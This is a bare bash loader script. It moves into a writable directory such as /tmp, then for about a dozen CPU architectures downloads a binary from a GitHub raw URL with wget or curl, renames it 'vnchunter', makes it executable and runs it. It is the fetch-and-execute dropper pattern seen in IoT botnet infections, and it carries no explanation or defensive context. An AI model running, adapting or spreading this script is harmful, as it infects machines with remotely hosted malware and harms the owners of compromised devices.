!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; for arch in arm arm5 arm6 arm7 m68k mpsl sh4 x86_64 mips ppc x86; do wget https://raw.githubusercontent.com/smar2-xyz/mriaivnc/main/main_$arch || curl -O https://raw.githubusercontent.com/smar2-xyz/mriaivnc/main/main_$arch; cat main_$arch >vnchunter; chmod +x *; ./vnchunter $arch.vnchunter; done
